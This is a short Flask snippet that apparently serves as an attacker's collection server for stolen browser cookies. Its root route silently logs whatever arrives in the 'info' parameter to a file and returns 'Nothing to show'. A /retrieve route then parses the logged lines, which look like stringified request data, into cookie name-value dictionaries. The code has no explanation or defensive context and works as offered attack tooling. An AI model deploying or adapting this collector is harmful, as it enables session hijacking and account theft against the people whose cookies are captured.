@app.route('/', methods=['POST','GET'])
def home():
    try:
        dat = request.args.get('info')
        with open('data.txt', 'a') as f:
            f.write(dat+'\n')
    except:
        pass
    return jsonify('Nothing to show')

@app.route('/retrieve')
def retrieve():
    fDat = []
    no_fail = 0
    with open('data.txt', 'r') as f:
        fDat = f.read().split('\n')
    cookie_ls = []
    for dat in fDat:
        try:
            if len(dat)>1:
                cookie_ls.append(extract_cookies(dat))
        except:
            no_fail +=1
            pass
    return jsonify(cookie_ls, no_fail)

def extract_cookies(dat):
    dat = dat[dat.index('id'):dat.index('werkzeug.request')-4]
    dat = dat.split(';')
    cookies = {}
    for i in range(len(dat)):
        dat[i] = dat[i].strip().split('=')
        if len(dat[i])>2:
            dat[i].pop()
            dat[i][1] += '='
        cookies[dat[i][0]] = dat[i][1]
    return cookies
